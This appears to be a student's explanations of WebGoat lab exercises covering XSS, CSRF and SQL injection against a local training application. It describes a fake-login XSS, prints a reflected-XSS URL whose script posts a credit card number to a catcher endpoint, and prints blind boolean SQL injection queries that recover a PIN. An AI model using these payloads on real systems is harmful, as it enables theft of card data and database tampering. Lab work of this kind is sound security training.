Part 1 Explanation:
Part 1 used a XSS attack that inputs a form and javascript code into the search field. And the website interpretes
the input as actual html code. The attack then constructed a fake login screen and submits recorded info to a designated
web address


Part 2 Explanation:
The field for the three digit access code is exploitable (name="input2"). The mallicious code is embedded into the mallicious URL 
and the access code input field of the website is modified by the URL. The embedded mallicious code checks the value of credit card
number field (name="input1") and if the value is different from the default value, the credit card number is posted to the catcher.
Unencoded URL:
http://localhost:6869/WebGoat/start.mvc#attack/752417971/900?&input2=<SCRIPT>document.getElementsByName("input2")[0].value="";if (document.getElementsByName('input1')[0].value != "4128 3214 0002 1999") {$.post('catcher?PROPERTY=yes&stolen-credit-card='+ document.getElementsByName('input1')[0].value);}</SCRIPT>


Part 3 Explanation:
The field that's exploitable is "Message" field. To exploit, a HTML image link is put inside of the "Message" field. The image link 
is a forged request that transfers 5000.

Part 4 Explanation:
The field that's exploitable is "Message" field. The message body contains 2 images, the first one has source as the mallicious
transfer request, the second image has no source. The first image's onerror function sets the source of the second image
to be the confirm URL of the transfer request. This will make sure that the confirm URL is requested after the transfer request.

Part 5 Explanation:


Part 6 Explanation:
Part 6 is an exploit in website's SQL that allows attacker to inject a SQL command as a string in the WHERE condition. 
To do so, we first terminate the string, then set a condition that's always true such as 1=1, then terminate with --.
This means the WHERE condition will always be true, so SQL will print every entry, instead of checking for a specific
user.

Part 7 Explanation:
Part 7 is injecting a SQL command that can modify the SQL database. The first part is to set a user's salary to some
desired amount, which can be done by using an update command following the userid input and a semicolon. The second
part is to inject a trigger into the SQL database that will keep updating based on the defined conditions in the
trigger function that we set. This is done by using a CREATE TRIGGER command after the userid input and a semicolon.
The condition for trigger is whenever a new user is inputed, set that user's email to our desired email.

Part 8 Explanation:
For part 8, we want to find the pin of a credit card number using the boolean check. To do so, we first start by
entering a valid account number which we know will yeild as valid. Then we make an 'EXISTS' statement following an
'AND', and check for the range of the pin of the credit card in the subquery. The subquery will return a tuple if the
subquery's 'WHERE' condition is met, and we can set the cc_number and check for range of pin in the subquery's 'WHERE'
condition. To check for pin range. We start by checking if pin is >= 1 and < 9999.
101 and exists (select True from credit where cc_number=1234123412341234 and pin>=1 and pin<9999) --

Then we increase the lowerbound to 1000. Then I tried to decrease the upperbound and found 4000 is the lowest upperbound
in the thousands that can yeild valid. I then increase the lowerbound from 1000 to 3000, then increase each digit of the
lowerbound until I found 3318 is the highest lowerbound.
101 and exists (select True from credit where cc_number=1234123412341234 and pin>=3318 and pin<4000) --

Then I check the pin is indeed equal to 3318 since this statement yields valid.
101 and exists (select True from credit where cc_number=1234123412341234 and pin=3318) --
